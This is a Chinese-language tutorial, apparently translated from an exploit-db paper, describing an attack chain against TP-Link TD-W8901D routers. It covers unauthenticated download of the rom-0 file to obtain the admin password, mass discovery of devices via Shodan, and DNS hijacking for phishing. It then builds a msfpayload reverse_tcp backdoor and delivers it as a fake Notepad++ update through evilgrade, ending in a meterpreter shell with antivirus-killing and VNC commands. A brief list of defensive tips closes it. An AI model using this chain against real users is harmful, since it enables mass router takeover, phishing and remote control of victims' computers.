# TPLINK渗透实战

**from: http://www.exploit-db.com/wp-content/themes/exploit/docs/33369.pdf**

0x00 工具
-------

* * *

一台笔记本电脑 TD-W8901D路由器（firmware 6.0.0） 虚拟机(WIN7)、Kali Linux（攻击机）、evilgrade（一个模块化的脚本框架，可实现伪造的升级、自带DNS和WEB服务模块，http://www.infobyte.com.ar/down/isr-evilgrade-Readme.txt) Metasploit。

0x01 示例
-------

* * *

**互联网攻击示意图：**

![enter image description here](http://drops.javaweb.org/uploads/images/e0c6c8f6f9d6b6717a0d5e1dd358d690591c8513.jpg)

**局域网攻击示意图**

![enter image description here](http://drops.javaweb.org/uploads/images/e0cdfcc988e1b8ea53ae92a093f48f243c3eb583.jpg)

市场上有很多类型的路由器可用，但绝大部分从未升级固件，所以可对大多数家用路由进行这个攻击，在这个项目中使用的是最常见的TPlink路由器。

TPLINK某些版本有一个关键的漏洞：未授权访问Firmware/Romfile界面，无需登陆密码，像这样http://IP//rpFWUpload.html。

同时也可以下载romfile备份文件（rom-0）,像这样：http://IP address/rom-0。

步骤一：下载rom文件![enter image description here](http://drops.javaweb.org/uploads/images/d8b8ce3bfaa815e441bf1a39a4632312901737d5.jpg)

下载回来的rom文件需要逆向工程得到明文密码，但有一个更简单的方法，去俄罗斯的一个网站可以解密 http://www.hakim.ws/huawei/rom-0/

步骤二：使用账号密码登陆![enter image description here](http://drops.javaweb.org/uploads/images/f7697aa0a2242fb62f09df8c3f56975af092e967.jpg)

第三步：使用搜索引擎SHODAN 搜索RomPager，可在互联网上找到700多万个这种设备![enter image description here](http://drops.javaweb.org/uploads/images/9adf04fd5f2643ce33407366780e9a6dc7cf0eb2.jpg)

简单的改变一下路由器的DNS，就可以重定向用户的请求，这个方法可以用来钓鱼（从我了解的情况看来，国内已经有大批路由被利用，并已经被黑产用作钓鱼欺诈，黑产表打我，我猜的）。但这个太简单了，作者希望玩的更高(hua)深(shao)一些。

默认DNS的配置是这样：![enter image description here](http://drops.javaweb.org/uploads/images/d0850c44c24db1e6ff0c188d75d9636f6ba95fa0.jpg)

改成攻击者自己的DNS：

![enter image description here](http://drops.javaweb.org/uploads/images/7aa8487f0df0c14f0363ecca2bd1f5260c08bbc4.jpg)

攻击系统：DNS服务器一台、kali预装了evilgrade 和metasploit。

![enter image description here](http://drops.javaweb.org/uploads/images/a97b422be089269e5bc32558dcbaafd4334cbe62.jpg)

第五步：建一个带后门的payload，给用户发送升级指令。LHOST= 攻击者机器IP和 LPORT =任何开放的端口。

```
Commad:@@# msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.5.132 LPORT=8080 x > navebackdoor.exe 

```

![2014071323521922657.jpg](http://drops.javaweb.org/uploads/images/d283d8879f7a3f653e6a8960e7f5b131d81d4a66.jpg)

第六步：启动metasploit、运行payload

![2014071323523583152.jpg](http://drops.javaweb.org/uploads/images/a3fd17d75be249e2ee98abfbc994f741fba0e1e9.jpg)

 ![2014071323530565178.jpg](http://drops.javaweb.org/uploads/images/3f8812694ee30ca9fd2611beed2fa0a9a19b87e9.jpg)

![2014071323531775176.jpg](http://drops.javaweb.org/uploads/images/554cb411ff5891f51bc2f9309fad2f0de9a4c909.jpg)

第七步：设置监听主机和监听端口，命令：set LHOST（攻击者的IP）、set LPORT（监听端口，创建后门时分配的）、exploit（进行攻击）

![2014071323533763041.jpg](http://drops.javaweb.org/uploads/images/feb5c76ce9c5fd54fd7b3e0ae3f85b94d302110f.jpg)

第八步：启动假的WEB升级服务器evilgrade，执行show modules后，可以看到很多假更新模块，这里选用notepadplus

![2014071323535610035.jpg](http://drops.javaweb.org/uploads/images/3783638f23050cb9e6511a55a312366058923488.jpg)

![2014071323541051845.jpg](http://drops.javaweb.org/uploads/images/68f416f65bac8f390661ea621f903804b2d03927.jpg)

![2014071323542812615.jpg](http://drops.javaweb.org/uploads/images/562b094514d48bf66ce04d24f96759435fcc2ddb.jpg)

第九步：show options可以看到模块的使用方法，设置后门升级文件路径使用agent：

```
Set  agent  ‘[“<%OUT%>/root/Desktop/navebackdoor.exe<%OUT%>”]’ 

```

![2014071323544287175.jpg](http://drops.javaweb.org/uploads/images/246c376a97fad4096518e7e3197550406de9db44.jpg)

第十步：完成以上动作后，启动EvilGrade的WEB服务器：

```
start

```

![2014071323550126547.jpg](http://drops.javaweb.org/uploads/images/81f3c0b9f7499f5761c8fcf3cf2f90082b87f2ba.jpg)

第十一步：等受害者打开notepadplus，一旦打开就会弹出要求更新的提示，更新过程中将会加载我们的后门程序。

![2014071323551940538.jpg](http://drops.javaweb.org/uploads/images/81f38080a2f6972084577ec80fccee4dcc85c526.jpg)

![2014071323553365266.jpg](http://drops.javaweb.org/uploads/images/d2e62c3f1a5c1956b783075f8920057296dbca59.jpg)

第十二步：在攻击机器上，evilgrade和Metasploit建立会话，等待返回的shell

![2014071323554774816.jpg](http://drops.javaweb.org/uploads/images/f8d927eaa8578dbe48466b433fc48b3aa311ab3b.jpg)

第十三步：拿到shell，使用sysinfo查看一下：

![2014071323560039521.jpg](http://drops.javaweb.org/uploads/images/6c08337533bba0ccd4ce6ee899572255d56615ef.jpg)

输入help可以看到很多命令，包括scrrenshot、killav,运行vnc 等

![2014071323561637433.jpg](http://drops.javaweb.org/uploads/images/0b2d34c65566f171b1d4fe9cc9a4997a17017fcd.jpg)

![2014071323563672357.jpg](http://drops.javaweb.org/uploads/images/9655d956ed19847d0d29efc05182d6626fa3e0dc.jpg)

0x02 防御方法
---------

* * *

经常升级你的路由器版本

路由器不要在公网暴露

系统和软件升级时检查证书

设置静态IP，比如google的8.8.8.8、8.8.4.4（广告：阿里巴巴的公共dns 223.5.5.5 和 223.6.6.6）